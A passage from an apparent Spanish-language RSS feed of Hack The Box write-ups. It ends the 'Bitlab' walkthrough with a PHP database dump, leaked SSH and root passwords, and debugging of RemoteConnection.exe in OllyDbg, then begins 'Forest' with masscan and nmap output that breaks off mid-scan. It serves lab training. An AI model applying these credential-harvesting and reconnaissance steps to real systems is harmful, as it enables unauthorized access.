&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$db_connection&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pg_connect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;host=localhost dbname=profiles user=profiles password=profiles&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pg_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$db_connection&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM profiles&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$arr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pg_fetch_all&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$arr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Codigo ejecutado:&lt;br /&gt;
Al ejecutar el codigo nos devuelve un usuario y contraseña, la contraseña codificada en base64.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2020.36.25.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Credenciales:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;clave:c3NoLXN0cjBuZy1wQHNz==
clave:ssh-str0ng-p@ss
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;shell---usuario-clave&#34;&gt;SHELL - Usuario clave&lt;/h2&gt;
&lt;p&gt;Actualizamos nuestra shell al intentar ingresar con la contraseña decodificada no la aceptó, utilizamos la codificada y obtuvimos shell como usuario clave.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2020.38.32.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y Nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-24%2020.40.17.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;re-reversing-engineering---remoteconnectionexe&#34;&gt;RE (reversing engineering) - RemoteConnection.exe&lt;/h3&gt;
&lt;p&gt;Dentro de la carpeta principal del usuario clave encontramos un archivo exe, trasladamos el archivo a nuestra maquina local para poder analizar el archivo.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-25%2000.32.18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;strong&gt;ollydbg&lt;/strong&gt; en su version 2.01 agregamos nuestro ejecutable en la interfaz de olly.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-25%2000.35.55.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al correr nuestro ejecutable nos muestra un mensaje en la ventana de ejecucion del archivo (Acceso Denegado).&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-25%2000.36.46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Buscamos el mensaje que nos muestra en la ventana haciendo click dentro de la ventana &lt;code&gt;Search for &amp;gt; All References Strings&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-25%2000.39.18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos varios mensajes (strings) vemos una string que es distinta a las demas colocamos un breakpoint en el string y volvemos a ejecutar y presionar F8.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-25%2000.41.20.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos nuestro breakpoint.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-25%2000.42.53.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos la conexion con el usuario root hacia la maquina de bitlab con la contraseña.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-25%2000.43.58.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Credenciales:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-ssh root@gitlab.htb -pw Qf7]8YSV.wDNF*[7d?j&amp;amp;eD4^&amp;quot;
root:Qf7]8YSV.wDNF*[7d?j&amp;amp;eD4^&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Utilizamos las credenciales y obtenemos una shell con el usuario root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/bitlab/Screenshot%20from%202019-09-25%2000.47.57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/bitlab/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/bitlab/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
            
              <category>ollydbg</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Forest</title>
        <link>https://sckull.github.io/posts/forest/</link>
        <pubDate>Fri, 10 Jan 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 10 Jan 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/forest/</guid>
        <description>Forest es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Forest es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Forest&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.158&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/2984&#34;&gt;mrb3n&lt;/a&gt; &amp;amp; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/1190&#34;&gt;egre55&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puerto tcp/udp, en el cual nos muestra varios puertos abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;117
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;118
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;119
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;120
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;121
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;122
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;123
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;124
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/htb/forest# masscan -p1-65535,U:1-65535 10.10.10.161 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-10-25 04:57:31 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 135/tcp on 10.10.10.161                                   
Discovered open port 464/tcp on 10.10.10.161                                   
Discovered open port 49910/tcp on 10.10.10.161                                 
Discovered open port 58925/udp on 10.10.10.161                                 
Discovered open port 445/tcp on 10.10.10.161                                   
Discovered open port 139/tcp on 10.10.10.161                                   
Discovered open port 49664/tcp on 10.10.10.161                                 
Discovered open port 9389/tcp on 10.10.10.161                                  
Discovered open port 49671/tcp on 10.10.10.161                                 
Discovered open port 49666/tcp on 10.10.10.161                                 
Discovered open port 3269/tcp on 10.10.10.161                                  
Discovered open port 593/tcp on 10.10.10.161                                   
Discovered open port 49667/tcp on 10.10.10.161                                 
Discovered open port 49676/tcp on 10.10.10.161                                 
Discovered open port 49703/tcp on 10.10.10.161                                 
Discovered open port 49684/tcp on 10.10.10.161                                 
Discovered open port 53/tcp on 10.10.10.161  

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Fri Oct 25 01:01:38 2019 as: nmap -p- --min-rate 1000 -o nmap.scan 10.10.10.161&lt;/span&gt;
Warning: 10.10.10.161 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.161
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.23s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;63731&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;1780&lt;/span&gt; filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49703/tcp open  unknown
49910/tcp open  unknown

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Oct 25 01:06:47 2019 -- 1 IP address (1 host up) scanned in 308.58 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Fri Oct 25 01:08:05 2019 as: nmap -sV -sC -p- --min-rate 1000 -o script_nmap.scan 10.10.10.161&lt;/span&gt;
Warning: 10.10.10.161 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.161
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.26s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;64311&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;1201&lt;/span&gt; filtered ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   DNSVersionBindReqTCP: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     version
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    &lt;span class=&#34;nb&#34;&gt;bind&lt;/span&gt;
88/tcp    open  kerberos-sec Microsoft Windows Kerberos &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;server time: 2019-10-25 05:20:03Z&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: htb.local, Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
445/tcp   open  microsoft-ds Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard &lt;span class=&#34;m&#34;&gt;14393&lt;/span&gt; microsoft-ds &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: HTB&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: htb.local, Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-HTTPAPI/2.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.70%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;10/25%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5DB2843D%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DNS
SF:VersionBindReqTCP,20,&lt;span class=&#34;s2&#34;&gt;&amp;#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x04bind\0\0\x10\0\x03&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
Service Info: Host: FOREST&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 2h27m49s, deviation: 4h02m51s, median: 7m36s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-os-discovery: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS: Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard &lt;span class=&#34;m&#34;&gt;14393&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard 6.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Computer name: FOREST
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NetBIOS computer name: FOREST&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Domain name: htb.local
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Forest name: htb.local
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   FQDN: FOREST.htb.local
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  System time: 2019-10-24T22:23:05-07:00
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   account_used: &amp;lt;blank&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   authentication_level: user
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   challenge_response: supported
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  message_signing: required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled and required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2019-10-25 01:22:33
